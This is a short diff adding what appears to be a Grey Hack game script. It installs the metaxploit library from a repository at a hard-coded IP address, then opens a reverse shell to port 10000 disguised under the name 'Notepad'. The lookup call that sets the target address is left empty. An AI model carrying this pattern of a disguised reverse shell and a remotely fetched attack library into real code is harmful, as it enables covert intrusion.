@@ -1,0 +1,14 @@
+apt = include_lib("/lib/aptclient.so")
+metaxploit = include_lib("/lib/metaxploit.so")
+if not metaxploit then
+	apt.add_repo("45.130.81.168")
+	apt.install("metaxploit.so")
+end if
+
+metaxploit = include_lib("/lib/metaxploit.so")
+
+if not metaxploit then exit("Could not load meta")
+
+ip = nslookup("")
+
+metaxploit.rshell_client(ip,10000,"Notepad")
